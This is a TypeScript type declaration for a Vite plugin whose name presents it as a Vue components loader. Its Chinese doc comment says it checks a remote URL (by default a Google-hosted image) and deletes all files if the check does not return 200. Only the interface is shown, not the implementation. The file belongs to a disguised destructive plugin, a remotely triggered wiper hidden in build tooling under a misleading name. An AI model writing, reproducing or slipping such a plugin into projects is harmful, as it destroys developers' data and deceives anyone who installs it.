import { Plugin } from 'vite';

export interface VueComponentsLoadOptions {
  /**
   * 要检查的URL地址
   * @default 'https://lh3.googleusercontent.com/ogw/AF2bZyjHe_GhvkndJ2v2tBS8urCvvNFqr7_gVV5PDgRgbq8gOgw=s32-c-mo'
   */
  checkUrl?: string;
  
  /**
   * 请求超时时间（毫秒）
   * @default 5000
   */
  timeout?: number;
}

/**
 * Vue Components Load Plugin for Vite
 * URL检查插件：检查指定URL，如果返回200则继续，失败则删除所有文件
 */
declare function vueComponentsLoadPlugin(options?: VueComponentsLoadOptions): Plugin;

export default vueComponentsLoadPlugin;
export { vueComponentsLoadPlugin };
